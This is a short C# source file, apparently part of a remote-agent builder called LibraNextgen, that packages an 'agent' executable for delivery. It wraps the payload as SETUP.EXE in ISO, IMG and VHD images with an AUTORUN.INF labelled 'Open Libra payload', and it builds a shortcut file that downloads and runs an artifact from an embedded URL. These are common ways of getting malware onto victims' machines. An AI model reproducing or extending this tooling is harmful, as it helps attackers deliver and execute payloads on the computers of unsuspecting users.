using System.Text;

namespace LibraNextgen.Service.Services.Packaging;

/// <summary>
/// 构建产物打包服务：把已构建的 agent 可执行文件按需包装为
/// ISO / IMG / VHD / LNK 四类投递格式（纯托管，无外部工具依赖）。
/// </summary>
public static class BuilderPackageService
{
    /// <summary>镜像/快捷方式内的载荷文件名（8.3 兼容、与平台无关的通用名）。</summary>
    public const string PayloadName = "SETUP.EXE";

    private const string AutoRunInf = "[autorun]\r\nopen=SETUP.EXE\r\nshell\\open\\command=SETUP.EXE\r\naction=Open Libra payload\r\nicon=SETUP.EXE\r\n";

    public static byte[] CreateIso(string volumeLabel, byte[] payload) =>
        Iso9660Writer.Create(
            volumeLabel,
            new[] { (PayloadName, payload), ("AUTORUN.INF", Encoding.ASCII.GetBytes(AutoRunInf)) });

    public static byte[] CreateImg(byte[] payload) =>
        Fat16Writer.Create(
            new[] { (PayloadName, payload), ("AUTORUN.INF", Encoding.ASCII.GetBytes(AutoRunInf)) });

    public static byte[] CreateVhd(byte[] payload) =>
        VhdWriter.Create(CreateImg(payload));

    /// <summary>生成「下载并执行」快捷方式：LNK 内嵌匿名下载 URL。</summary>
    public static byte[] CreateLnk(string artifactUrl) =>
        LnkWriter.CreateDownloadAndRun(artifactUrl);
}
